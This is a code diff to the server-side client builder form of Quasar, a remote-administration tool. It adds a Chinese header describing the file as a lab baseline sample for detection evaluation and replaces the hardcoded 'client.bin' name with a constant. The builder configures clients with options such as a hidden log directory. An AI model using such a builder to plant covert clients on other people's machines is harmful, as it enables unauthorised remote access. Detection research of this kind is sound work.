@@ -1,5 +1,13 @@
-﻿using Quasar.Common.DNS;
+﻿// ---------------------------------------------------------------------------
+// Quasar 检测评估实验台 · 实验室基线样本（Quasar-LabBaseline）
+// 作者：陈森（Chen Sen）  https://github.com/chendashi666
+// 本文件由陈森创作或改造：禁止盗卖，禁止商业用途。
+// 上游 Quasar 代码版权归 MaxXor 及 Quasar 贡献者所有（MIT License）。
+// ---------------------------------------------------------------------------
+
+using Quasar.Common.DNS;
 using Quasar.Common.Helpers;
+using Quasar.Common.Properties;
 using Quasar.Server.Build;
 using Quasar.Server.Models;
 using System;
@@ -274,9 +282,10 @@ namespace Quasar.Server.Forms
             options.LogDirectoryName = txtLogDirectoryName.Text;
             options.HideLogDirectory = chkHideLogDirectory.Checked;
 
-            if (!File.Exists("client.bin"))
+            if (!File.Exists(LabStrings.ClientBinaryName))
             {
-                throw new Exception("Could not locate \"client.bin\" file. It should be in the same directory as Quasar.");
+                throw new Exception("Could not locate \"" + LabStrings.ClientBinaryName +
+                                    "\" file. It should be in the same directory as Quasar.");
             }
 
             if (options.RawHosts.Length < 2)
@@ -378,7 +387,7 @@ namespace Quasar.Server.Forms
             {
                 BuildOptions options = (BuildOptions) o;
 
-                var builder = new ClientBuilder(options, "client.bin");
+                var builder = new ClientBuilder(options, LabStrings.ClientBinaryName);
 
                 builder.Build();
 
